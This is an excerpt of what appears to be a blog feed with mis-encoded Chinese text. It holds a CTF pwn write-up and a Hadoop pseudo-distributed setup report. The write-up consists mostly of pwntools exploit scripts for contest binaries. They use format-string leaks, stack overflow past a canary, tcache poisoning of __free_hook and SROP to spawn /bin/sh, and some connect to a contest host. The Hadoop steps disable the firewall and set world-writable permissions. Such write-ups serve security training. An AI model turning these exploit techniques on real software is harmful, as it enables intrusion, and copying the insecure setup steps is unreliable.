<h3 id="è§£é¢˜æ€è·¯-v3"><a class="header-anchor" href="#è§£é¢˜æ€è·¯-v3">Â¶</a>è§£é¢˜æ€è·¯</h3>
<pre><code>åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å¾—åˆ°ç¨‹åºåŸºåœ°å€ä»¥åŠcanaryå€¼ï¼Œç„¶ååˆ©ç”¨æ ˆæº¢å‡ºè°ƒç”¨åé—¨
</code></pre>
<h3 id="exp-v18"><a class="header-anchor" href="#exp-v18">Â¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;find_flag&quot;</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;find_flag&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28077</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name?&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;aa%16$p..%17$p&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;aa&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf_base = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x1140</span></span><br><span class="line">success(<span class="string">&quot;elf_base:&quot;</span>+<span class="built_in">hex</span>(elf_base))</span><br><span class="line">flag_addr = elf_base + <span class="number">0x1228</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;..&quot;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&quot;canary:&quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line">p.recvuntil(<span class="string">&quot;? &quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(canary) + p64(<span class="number">0</span>)+p64(flag_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="2021-æ·±è‚²æ¯-create-code"><a class="header-anchor" href="#2021-æ·±è‚²æ¯-create-code">Â¶</a>[2021 æ·±è‚²æ¯]create code</h2>
<h3 id="é¢˜ç›®è€ƒç‚¹-v18"><a class="header-anchor" href="#é¢˜ç›®è€ƒç‚¹-v18">Â¶</a>é¢˜ç›®è€ƒç‚¹</h3>
<pre><code>1.å †æº¢å‡º
2.tcache attack
</code></pre>
<h3 id="è§£é¢˜æ€è·¯-v4"><a class="header-anchor" href="#è§£é¢˜æ€è·¯-v4">Â¶</a>è§£é¢˜æ€è·¯</h3>
<p>åˆ©ç”¨addå‡½æ•°ä¸­çš„æº¢å‡º ç”¨å½¢å¦‚å¦‚ä¸‹çš„æ„é€ æ¥ä¿®æ”¹å †å—çš„size,æ¥æ³„éœ²libc</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>ç„¶åæ„é€ tcache attack æ¥åŠ«æŒfree_hookã€‚<br>
æœ€åæ³¨æ„ä¸èƒ½ç›´æ¥</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free()</span><br></pre></td></tr></table></figure>
<p>æ¥getshell,å› ä¸ºå †å—åœ¨ç”³è¯·çš„æ—¶å€™ä¼šå­˜åœ¨ä¸€ä¸ª\x04<br>
<img src="https://gitee.com/Nss-harukii/images/raw/master/C.png" alt="pic"></p>
<p>æ‰€ä»¥åªèƒ½é€šè¿‡æº¢å‡ºæ¥ä¿®æ”¹å…¶ä¸º/bin/sh</p>
<h3 id="exp-v19"><a class="header-anchor" href="#exp-v19">Â¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;create_code&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;1.14.71.254&quot;,28035)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">choice</span>):</span></span><br><span class="line">  p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">content</span>):</span></span><br><span class="line">  choice(<span class="number">1</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">  p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">  choice(<span class="number">2</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;id: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">  choice(<span class="number">3</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;id: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>) <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x328</span>+p64(<span class="number">0x991</span>)) <span class="comment">#0</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>) <span class="comment">#0</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1ebbe0</span></span><br><span class="line">success(<span class="string">&quot;libc:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>) </span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>) </span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x328</span>+p64(<span class="number">0x331</span>)+p64(free_hook-<span class="number">0x10</span>)) <span class="comment">#0</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x328</span>+p64(<span class="number">0x331</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(system))</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="CISCN-2019åå—-PWN3"><a class="header-anchor" href="#CISCN-2019åå—-PWN3">Â¶</a>[CISCN 2019åå—]PWN3</h2>
<h3 id="é¢˜ç›®è€ƒç‚¹-v19"><a class="header-anchor" href="#é¢˜ç›®è€ƒç‚¹-v19">Â¶</a>é¢˜ç›®è€ƒç‚¹</h3>
<pre><code>srop
</code></pre>
<h3 id="é¢˜ç›®åˆ†æ-v9"><a class="header-anchor" href="#é¢˜ç›®åˆ†æ-v9">Â¶</a>é¢˜ç›®åˆ†æ</h3>
<p>è§SROPä¾‹é¢˜éƒ¨åˆ†</p>
<h3 id="EXP-v6"><a class="header-anchor" href="#EXP-v6">Â¶</a>EXP</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;ciscn_s_3&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28101</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;ciscn_s_3&#x27;</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">syscall_15 = <span class="number">0x0000000004004DA</span></span><br><span class="line">syscall = <span class="number">0x000000000400517</span> </span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(main))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">stack_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;stack:&quot;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">bin_sh = stack_addr - <span class="number">0x138</span></span><br><span class="line">farme = SigreturnFrame()</span><br><span class="line">farme.rax = <span class="number">59</span></span><br><span class="line">farme.rdi = bin_sh</span><br><span class="line">farme.rip = syscall</span><br><span class="line">farme.rsi = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0</span>)+p64(syscall_15)+p64(syscall)+<span class="built_in">bytes</span>(farme)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="CISCN-2021-lonelywolf"><a class="header-anchor" href="#CISCN-2021-lonelywolf">Â¶</a>[CISCN 2021] lonelywolf</h2>
<h3 id="é¢˜ç›®è€ƒç‚¹-v20"><a class="header-anchor" href="#é¢˜ç›®è€ƒç‚¹-v20">Â¶</a>é¢˜ç›®è€ƒç‚¹</h3>
<pre><code>tcache attack
</code></pre>
<h3 id="exp-v20"><a class="header-anchor" href="#exp-v20">Â¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;lonelywolf&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28134</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">choice</span>):</span></span><br><span class="line">  p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size</span>):</span></span><br><span class="line">  choice(<span class="number">1</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">  p.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">  choice(<span class="number">2</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">  p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">  p.sendline(content)</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">  choice(<span class="number">3</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">  choice(<span class="number">4</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span> </span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#add(0,0x78)</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x260</span></span><br><span class="line">success(<span class="string">&quot;heap:&quot;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line">edit(<span class="number">0</span>,p64(heap_base+<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x7000000</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line">success(<span class="string">&quot;libc:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x78</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x78</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(system))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x78</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<!--
CTFè®°è´¦ 
2021-11-07 å®éªŒå®¤æ¡¶è£…æ°´-39 å‰©ä½™961
2021-11-14 å®éªŒå®¤æ¡¶è£…æ°´-26 å‰©ä½™935
2021-12-14 WDLJTæŠ¥é”€-714  å‰©ä½™221
-->]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¼ªåˆ†å¸ƒå¼ç¯å¢ƒæ­å»ºå®éªŒæŠ¥å‘Š</title>
    <url>/2021/10/18/hadoop/</url>
    <content><![CDATA[<p><img src="https://gitee.com/Nss-harukii/images/raw/master/21.jpg" alt="pic"></p>
<span id="more"></span>
<h3 id="step1-è™šæ‹Ÿæœºå®‰è£…ä¸æ“ä½œ"><a class="header-anchor" href="#step1-è™šæ‹Ÿæœºå®‰è£…ä¸æ“ä½œ">Â¶</a>step1 è™šæ‹Ÿæœºå®‰è£…ä¸æ“ä½œ</h3>
<p><img src="http://static.zybuluo.com/hgggg/8v2nqbfn8jkcxx5conjhlkxx/5.png" alt="5.png-18.4kB"><br>
æ–°å»ºè™šæ‹Ÿæœºé€‰æ‹©ubbuntu16é•œåƒï¼Œç„¶åä¸€ç›´ä¸‹ä¸€æ­¥å³å¯<br>
<img src="http://static.zybuluo.com/hgggg/wu3uhxlmekqyrizfqky30ur3/6.png" alt="6.png-39.1kB"></p>
<p>ç”±äºä¹‹å‰å®‰è£…äº†VMtoolsï¼Œæ‰€ä»¥æ¥ä¸‹æ¥ç›´æ¥å°†hadoopå’Œjdkçš„å‹ç¼©åŒ…å¤åˆ¶ç²˜è´´è¿›è™šæ‹Ÿæœº<br>
<img src="http://static.zybuluo.com/hgggg/hkm8rlfla9qgosphhb999mo0/7.png" alt="7.png-32.5kB"></p>
<h3 id="step2-ç¯å¢ƒæ­å»º"><a class="header-anchor" href="#step2-ç¯å¢ƒæ­å»º">Â¶</a>step2 ç¯å¢ƒæ­å»º</h3>
<h4 id="javaç¯å¢ƒé…ç½®"><a class="header-anchor" href="#javaç¯å¢ƒé…ç½®">Â¶</a>javaç¯å¢ƒé…ç½®</h4>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo mkdir /usr/java</span><br><span class="line">sudo tar -zxvf jdk-8u221-linux-x64.tar.gz -C /usr/java/</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo vim ~/.bashrc</span><br></pre></td></tr></table></figure>
<p>åœ¨æœ€åä¸€è¡ŒåŠ ä¸Š<br>
<img src="http://static.zybuluo.com/hgggg/zg3bhvxnuj0wwe80kcnbv0x2/8.png" alt="8.png-12.7kB"></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/profile</span><br></pre></td></tr></table></figure>
<p>åœ¨æœ€åä¸€è¡ŒåŠ ä¸Š<br>
<img src="http://static.zybuluo.com/hgggg/bh49xexp4kdug5r819ab8lyf/9.png" alt="9.png-15.8kB"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/environment</span><br></pre></td></tr></table></figure>
<p>åœ¨æœ€åä¸€è¡ŒåŠ ä¸Š<br>
<img src="http://static.zybuluo.com/hgggg/zw5n598yswt03dw0fg3hzk1u/10.png" alt="10.png-10.4kB"></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> /etc/environment</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">java -version</span><br></pre></td></tr></table></figure>
<p><img src="http://static.zybuluo.com/hgggg/lp4dc2f7lxtop63hqyevdg13/11.png" alt="11.png-14.5kB"></p>
<h4 id="ssh-serveré…ç½®"><a class="header-anchor" href="#ssh-serveré…ç½®">Â¶</a>ssh-serveré…ç½®</h4>
<p>å®‰è£…å¹¶å¯åŠ¨ssh-server</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt-get install openssh-server</span><br><span class="line">sudo /etc/init.d/ssh start</span><br></pre></td></tr></table></figure>
<p>ç”ŸæˆRSA</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line">cat ~/.ssh/id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
<p>å…³é—­é˜²ç«å¢™</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo ufw <span class="built_in">disable</span></span><br></pre></td></tr></table></figure>
<p>é“¾æ¥æµ‹è¯•<br>
<img src="http://static.zybuluo.com/hgggg/vbqf9nt6wvop920d6ihu69q2/12.png" alt="12.png-32.6kB"></p>
<h4 id="å®‰è£…hadoop"><a class="header-anchor" href="#å®‰è£…hadoop">Â¶</a>å®‰è£…hadoop</h4>
<p>è§£å‹</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo tar zxvf hadoop-2.7.4.tar.gz -C /usr/<span class="built_in">local</span></span><br><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span></span><br><span class="line">sudo mv hadoop-2.7.4 hadoop </span><br><span class="line">sudo chmod 777 -R /usr/<span class="built_in">local</span>/hadoop</span><br></pre></td></tr></table></figure>
<p>é…ç½®</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo vim ~/.bashrc</span><br></pre></td></tr></table></figure>
<p>åœ¨æœ€ååŠ ä¸Š<br>
<img src="http://static.zybuluo.com/hgggg/uwjocl7bhzecsqmdevsy64pr/13.png" alt="13.png-36.4kB"></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo vim /usr/<span class="built_in">local</span>/hadoop/etc/hadoop/hadoop-env.sh</span><br></pre></td></tr></table></figure>
<p>åœ¨æœ€ååŠ ä¸Š<br>
<img src="http://static.zybuluo.com/hgggg/j0s4jddn51fvz0k4lrs068qa/14.png" alt="14.png-9.7kB"></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo vim /usr/<span class="built_in">local</span>/hadoop/etc/hadoop/yarn-env.sh</span><br></pre></td></tr></table></figure>
<p>åœ¨æœ€ååŠ ä¸Š<br>
<img src="http://static.zybuluo.com/hgggg/e6quobwwxiaobhmttaxi3j6c/15.png" alt="15.png-9.4kB"></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo vim /usr/<span class="built_in">local</span>/hadoop/etc/hadoop/core-site.xml</span><br></pre></td></tr></table></figure>
<p>åœ¨configurationæ ‡ç­¾ä¸­åŠ å…¥</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">name</span>&gt;</span>hadoop.tmp.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">value</span>&gt;</span>file:/usr/local/hadoop/tmp<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">description</span>&gt;</span>Abase for other temporary directories.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">name</span>&gt;</span>fs.defaultFS<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">value</span>&gt;</span>hdfs://localhost:9000<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo vim /usr/<span class="built_in">local</span>/hadoop/etc/hadoop/hdfs-site.xml</span><br></pre></td></tr></table></figure>
<p>åœ¨configurationæ ‡ç­¾ä¸­åŠ å…¥</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.replication<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">value</span>&gt;</span>1<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.name.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">value</span>&gt;</span>file:/usr/local/hadoop/tmp/dfs/name<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.datanode.data.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">value</span>&gt;</span>file:/usr/local/hadoop/tmp/dfs/data<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo vim /usr/<span class="built_in">local</span>/hadoop/etc/hadoop/yarn-site.xml </span><br></pre></td></tr></table></figure>
<p>åœ¨configurationæ ‡ç­¾ä¸­åŠ å…¥</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span> </span><br><span class="line"><span class="comment">&lt;!-- Site specific YARN configuration properties --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.aux-services<span class="tag">&lt;/<span class="name">name</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>mapreduce_shuffle<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.aux-services.mapreduce.shuffle.class<span class="tag">&lt;/<span class="name">name</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>org.apache.hadoop.mapred.ShuffleHandler<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.address<span class="tag">&lt;/<span class="name">name</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>127.0.0.1:8032<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.scheduler.address<span class="tag">&lt;/<span class="name">name</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>127.0.0.1:8030<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.resource-tracker.address<span class="tag">&lt;/<span class="name">name</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>127.0.0.1:8031<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>é‡å¯åè¾“å…¥</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hadoop version</span><br></pre></td></tr></table></figure>
